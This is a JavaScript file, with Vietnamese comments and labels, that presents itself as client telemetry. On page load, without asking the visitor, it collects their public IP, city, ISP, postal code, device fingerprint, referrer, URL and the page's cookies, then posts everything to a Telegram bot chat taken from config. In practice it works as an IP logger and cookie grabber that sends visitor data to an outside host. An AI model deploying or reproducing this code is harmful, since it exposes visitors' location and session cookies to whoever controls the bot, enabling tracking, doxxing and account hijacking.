import {
  TELEGRAM_API_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  IP_LOOKUP_URL,
} from '../config.js';

// ==================== TELEMETRY TRACKING ====================
const telemetry = {
  errors: [],
  pageLoadTime: performance.now(),
};

// Bắt lỗi JavaScript
window.addEventListener('error', (event) => {
  telemetry.errors.push({
    type: 'error',
    message: event.message,
    source: event.filename,
    line: event.lineno,
    column: event.colno,
    timestamp: new Date().toISOString(),
  });
});

// Bắt lỗi Promise
window.addEventListener('unhandledrejection', (event) => {
  telemetry.errors.push({
    type: 'unhandledrejection',
    message:
      (event.reason && event.reason.message) ||
      (typeof event.reason === 'string' ? event.reason : JSON.stringify(event.reason)),
    timestamp: new Date().toISOString(),
  });
});

// ==================== HELPER FUNCTIONS ====================
const escapeHtml = (value) =>
  String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

const formatValue = (value) => {
  if (value === null || value === undefined) {
    return 'Không có';
  }

  if (typeof value === 'string') {
    return value.trim() === '' ? 'Trống' : value;
  }

  if (Array.isArray(value)) {
    if (!value.length) {
      return '[]';
    }
    const hasObjects = value.some((item) => item && typeof item === 'object');
    if (hasObjects) {
      try {
        return JSON.stringify(value, null, 2);
      } catch {
        return value.map((item) => String(item)).join(', ');
      }
    }
    return value.join(', ');
  }

  if (typeof value === 'object') {
    try {
      return JSON.stringify(value, null, 2);
    } catch {
      return String(value);
    }
  }

  return String(value);
};

// ==================== NAVIGATION TIMING ====================
const getNavigationTiming = () => {
  const navigationEntry = performance.getEntriesByType('navigation')[0];
  if (!navigationEntry) return null;

  return {
    'DNS Lookup': Math.round(navigationEntry.domainLookupEnd - navigationEntry.domainLookupStart),
    'TCP Connection': Math.round(navigationEntry.connectEnd - navigationEntry.connectStart),
    'Time to First Byte': Math.round(navigationEntry.responseStart - navigationEntry.requestStart),
    'DOM Content Loaded': Math.round(navigationEntry.domContentLoadedEventEnd - navigationEntry.startTime),
    'Total Load Time': Math.round(navigationEntry.loadEventEnd - navigationEntry.startTime),
    'Transfer Size': `${Math.round(navigationEntry.transferSize / 1024)} KB`,
  };
};

// ==================== NETWORK INFO ====================
const getNetworkInfo = () => {
  const connection =
    navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

  if (!connection) return null;

  return {
    'Effective Type': connection.effectiveType || 'N/A',
    'Downlink': connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
    'RTT': connection.rtt ? `${connection.rtt} ms` : 'N/A',
    'Save Data': connection.saveData ? 'Yes' : 'No',
  };
};

// ==================== CLIENT HINTS ====================
const fetchClientHints = async () => {
  if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) {
    return null;
  }

  try {
    const highEntropy = await navigator.userAgentData.getHighEntropyValues([
      'architecture',
      'bitness',
      'model',
      'platform',
      'platformVersion',
      'uaFullVersion',
    ]);

    return {
      'Brands': navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || 'N/A',
      'Mobile': navigator.userAgentData.mobile ? 'Yes' : 'No',
      'Platform': highEntropy.platform || 'N/A',
      'Platform Version': highEntropy.platformVersion || 'N/A',
      'Architecture': highEntropy.architecture || 'N/A',
      'Bitness': highEntropy.bitness || 'N/A',
      'Model': highEntropy.model || 'N/A',
      'Full Version': highEntropy.uaFullVersion || 'N/A',
    };
  } catch (error) {
    telemetry.errors.push({
      type: 'client-hints',
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

// ==================== PUBLIC IP INFO ====================
const fetchPublicIpInfo = async () => {
  if (!IP_LOOKUP_URL) {
    return { error: 'IP lookup bị tắt trong config' };
  }

  try {
    const response = await fetch(IP_LOOKUP_URL, { cache: 'no-store' });
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    const data = await response.json();
    return {
      'IP Address': data.ip || 'N/A',
      'Location': [data.city, data.region, data.country_name].filter(Boolean).join(', ') || 'N/A',
      'Country Code': data.country_code || 'N/A',
      'ISP/Organization': data.org || 'N/A',
      'Timezone': data.timezone || 'N/A',
      'Postal Code': data.postal || 'N/A',
      'ASN': data.asn || 'N/A',
    };
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    telemetry.errors.push({ type: 'ip-lookup', message });
    return { error: `Lỗi: ${message}` };
  }
};

// ==================== SCREEN & DEVICE INFO ====================
const getScreenInfo = () => {
  return {
    'Screen Resolution': `${screen.width}x${screen.height}`,
    'Available Screen': `${screen.availWidth}x${screen.availHeight}`,
    'Color Depth': `${screen.colorDepth}-bit`,
    'Pixel Ratio': window.devicePixelRatio || 1,
    'Viewport Size': `${window.innerWidth}x${window.innerHeight}`,
    'Orientation': screen.orientation?.type || 'N/A',
  };
};

// ==================== BROWSER FEATURES ====================
const getBrowserFeatures = () => {
  return {
    'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
    'Do Not Track': navigator.doNotTrack || 'Not set',
    'Online Status': navigator.onLine ? 'Online' : 'Offline',
    'Touch Support': 'ontouchstart' in window ? 'Yes' : 'No',
    'Local Storage': typeof localStorage !== 'undefined' ? 'Available' : 'Not available',
    'Session Storage': typeof sessionStorage !== 'undefined' ? 'Available' : 'Not available',
    'WebGL': (() => {
      const canvas = document.createElement('canvas');
      return canvas.getContext('webgl') || canvas.getContext('experimental-webgl') ? 'Supported' : 'Not supported';
    })(),
  };
};

// ==================== COLLECT ALL CLIENT CONTEXT ====================
const collectClientContext = async () => {
  const [ipInfo, clientHints] = await Promise.all([
    fetchPublicIpInfo(),
    fetchClientHints(),
  ]);

  return {
    timestamp: new Date().toISOString(),
    ipInfo,
    referrer: document.referrer || 'Direct visit (no referrer)',
    currentUrl: window.location.href,
    language: navigator.language || 'N/A',
    languages: navigator.languages?.join(', ') || 'N/A',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
    cookies: document.cookie || 'No cookies',
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    vendor: navigator.vendor || 'N/A',
    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    screenInfo: getScreenInfo(),
    networkInfo: getNetworkInfo(),
    clientHints,
    navigationTiming: getNavigationTiming(),
    browserFeatures: getBrowserFeatures(),
    errors: telemetry.errors.length > 0 ? telemetry.errors : [],
  };
};

// ==================== BUILD TELEGRAM MESSAGE ====================
const buildTelegramMessage = (context) => {
  const lines = [
    `🔍 <b>Thông tin Client Telemetry</b>`,
    '',
    `⏰ <b>Thời gian:</b> ${new Date(context.timestamp).toLocaleString('vi-VN')}`,
    `🌐 <b>URL:</b> ${escapeHtml(context.currentUrl)}`,
  ];

  // IP Information
  if (context.ipInfo && !context.ipInfo.error) {
    lines.push('', '📍 <b>Thông tin IP & Vị trí</b>');
    Object.entries(context.ipInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  } else if (context.ipInfo?.error) {
    lines.push('', `📍 <b>IP Info:</b> ${escapeHtml(context.ipInfo.error)}`);
  }

  // Browser & System
  lines.push(
    '',
    '🖥️ <b>Trình duyệt & Hệ thống</b>',
    `  • User Agent: ${escapeHtml(context.userAgent)}`,
    `  • Platform: ${escapeHtml(String(context.platform))}`,
    `  • Vendor: ${escapeHtml(String(context.vendor))}`,
    `  • Language: ${escapeHtml(context.language)}`,
    `  • All Languages: ${escapeHtml(context.languages)}`,
    `  • Timezone: ${escapeHtml(context.timezone)}`,
    `  • CPU Cores: ${context.hardwareConcurrency}`,
    `  • Touch Points: ${context.maxTouchPoints}`,
  );

  // Screen Info
  if (context.screenInfo) {
    lines.push('', '📱 <b>Màn hình & Thiết bị</b>');
    Object.entries(context.screenInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Client Hints
  if (context.clientHints) {
    lines.push('', '💡 <b>Client Hints (High Entropy)</b>');
    Object.entries(context.clientHints).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Network Info
  if (context.networkInfo) {
    lines.push('', '🌐 <b>Thông tin Mạng</b>');
    Object.entries(context.networkInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Navigation Timing
  if (context.navigationTiming) {
    lines.push('', '⚡ <b>Performance Timing (ms)</b>');
    Object.entries(context.navigationTiming).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Browser Features
  if (context.browserFeatures) {
    lines.push('', '✨ <b>Tính năng Trình duyệt</b>');
    Object.entries(context.browserFeatures).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Referrer & Cookies
  lines.push(
    '',
    '🔗 <b>Navigation & Tracking</b>',
    `  • Referrer: ${escapeHtml(context.referrer)}`,
    `  • Cookies: ${escapeHtml(context.cookies)}`,
  );

  // Errors
  if (context.errors.length > 0) {
    lines.push('', '⚠️ <b>Lỗi đã bắt được</b>');
    context.errors.forEach((err, idx) => {
      lines.push(`  ${idx + 1}. [${err.type}] ${escapeHtml(err.message)}`);
    });
  } else {
    lines.push('', '✅ <b>Không có lỗi</b>');
  }

  return lines.join('\n');
};

// ==================== SEND TO TELEGRAM ====================
const sendToTelegram = async (message) => {
  const response = await fetch(`${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });

  if (!response.ok) {
    throw new Error(`Telegram API failed (${response.status})`);
  }

  const result = await response.json();
  if (!result.ok) {
    throw new Error(result.description ?? 'Telegram API error');
  }

  return result;
};

// ==================== UI UPDATES ====================
const updateUI = (status, message, context = null) => {
  const spinner = document.querySelector('.spinner');
  const statusText = document.getElementById('status-text');
  const infoDisplay = document.getElementById('info-display');

  if (spinner) spinner.style.display = status === 'loading' ? 'block' : 'none';
  if (statusText) {
    statusText.textContent = message;
    statusText.className = status === 'error' ? 'error' : status === 'success' ? 'success' : '';
  }

  if (context && infoDisplay) {
    infoDisplay.style.display = 'block';
    infoDisplay.innerHTML = generateInfoHTML(context);
  }
};

const generateInfoHTML = (context) => {
  const items = [];

  if (context.ipInfo && !context.ipInfo.error) {
    items.push(`<div class="info-item"><span class="info-label">IP:</span> ${escapeHtml(context.ipInfo['IP Address'] || 'N/A')}</div>`);
    items.push(`<div class="info-item"><span class="info-label">Vị trí:</span> ${escapeHtml(context.ipInfo['Location'] || 'N/A')}</div>`);
    items.push(`<div class="info-item"><span class="info-label">ISP:</span> ${escapeHtml(context.ipInfo['ISP/Organization'] || 'N/A')}</div>`);
  }

  items.push(`<div class="info-item"><span class="info-label">Trình duyệt:</span> ${escapeHtml(context.platform)} - ${escapeHtml(context.language)}</div>`);
  items.push(`<div class="info-item"><span class="info-label">Referrer:</span> ${escapeHtml(context.referrer)}</div>`);

  if (context.screenInfo) {
    items.push(`<div class="info-item"><span class="info-label">Màn hình:</span> ${escapeHtml(String(context.screenInfo['Screen Resolution']))}</div>`);
  }

  return items.join('');
};

// ==================== CHECK CONFIG ====================
const isConfigured = () =>
  Boolean(
    TELEGRAM_API_URL &&
      TELEGRAM_API_URL.startsWith('http') &&
      TELEGRAM_BOT_TOKEN &&
      TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' &&
      TELEGRAM_CHAT_ID &&
      TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID'
  );

// ==================== MAIN AUTO-SEND LOGIC ====================
const autoSendTelemetry = async () => {
  try {
    updateUI('loading', 'Đang thu thập thông tin client...');

    // Check config first
    if (!isConfigured()) {
      updateUI('error', 'Chưa cấu hình Telegram! Vui lòng cập nhật config.js');
      return;
    }

    // Collect all data
    const context = await collectClientContext();
    
    // Display collected info
    updateUI('loading', 'Đã thu thập xong, đang gửi đến Telegram...', context);

    // Build and send message
    const message = buildTelegramMessage(context);
    await sendToTelegram(message);

    updateUI('success', '✅ Đã gửi thành công đến Telegram!', context);
  } catch (error) {
    console.error('Error:', error);
    updateUI('error', `❌ Lỗi: ${error.message}`);
  }
};

// ==================== AUTO-RUN ON PAGE LOAD ====================
// Wait for DOM and network to be ready, then auto-send
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(autoSendTelemetry, 500); // Small delay to ensure all metrics are captured
  });
} else {
  setTimeout(autoSendTelemetry, 500);
}
